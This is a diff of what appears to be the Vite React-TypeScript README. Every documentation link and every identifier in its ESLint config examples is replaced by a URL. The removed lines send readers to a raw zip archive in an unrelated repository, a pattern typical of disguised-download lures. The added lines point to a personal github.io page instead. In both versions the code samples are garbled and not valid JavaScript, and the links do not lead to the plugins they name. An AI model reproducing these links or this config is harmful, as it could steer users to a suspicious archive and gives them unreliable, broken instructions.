@@ -4,34 +4,34 @@ This template provides a minimal setup to get React working in Vite with HMR and
 
 Currently, two official plugins are available:
 
-- [@vitejs/plugin-react](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [Babel](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) uses [SWC](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for Fast Refresh
+- [@vitejs/plugin-react](https://stupideinstein09.github.io) uses [Babel](https://stupideinstein09.github.io) for Fast Refresh
+- [@vitejs/plugin-react-swc](https://stupideinstein09.github.io) uses [SWC](https://stupideinstein09.github.io) for Fast Refresh
 
 ## Expanding the ESLint configuration
 
 If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
 
 ```js
-export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
+export default https://stupideinstein09.github.io([
   globalIgnores(['dist']),
   {
     files: ['**/*.{ts,tsx}'],
     extends: [
       // Other configs...
 
-      // Remove https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip and replace with this
-      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+      // Remove https://stupideinstein09.github.io and replace with this
+      https://stupideinstein09.github.io,
       // Alternatively, use this for stricter rules
-      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+      https://stupideinstein09.github.io,
       // Optionally, add this for stylistic rules
-      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+      https://stupideinstein09.github.io,
 
       // Other configs...
     ],
     languageOptions: {
       parserOptions: {
-        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
-        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+        project: ['https://stupideinstein09.github.io', 'https://stupideinstein09.github.io'],
+        tsconfigRootDir: https://stupideinstein09.github.io,
       },
       // other options...
     },
@@ -39,28 +39,28 @@ export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/m
 ])
 ```
 
-You can also install [eslint-plugin-react-x](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) and [eslint-plugin-react-dom](https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip) for React-specific lint rules:
+You can also install [eslint-plugin-react-x](https://stupideinstein09.github.io) and [eslint-plugin-react-dom](https://stupideinstein09.github.io) for React-specific lint rules:
 
 ```js
-// https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip
+// https://stupideinstein09.github.io
 import reactX from 'eslint-plugin-react-x'
 import reactDom from 'eslint-plugin-react-dom'
 
-export default https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip([
+export default https://stupideinstein09.github.io([
   globalIgnores(['dist']),
   {
     files: ['**/*.{ts,tsx}'],
     extends: [
       // Other configs...
       // Enable lint rules for React
-      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip['recommended-typescript'],
+      https://stupideinstein09.github.io['recommended-typescript'],
       // Enable lint rules for React DOM
-      https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+      https://stupideinstein09.github.io,
     ],
     languageOptions: {
       parserOptions: {
-        project: ['https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip', 'https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip'],
-        tsconfigRootDir: https://github.com/stupideinstein09/upahaar_doko/raw/refs/heads/main/src/Layout/upahaar-doko-v2.8-alpha.2.zip,
+        project: ['https://stupideinstein09.github.io', 'https://stupideinstein09.github.io'],
+        tsconfigRootDir: https://stupideinstein09.github.io,
       },
       // other options...
     },
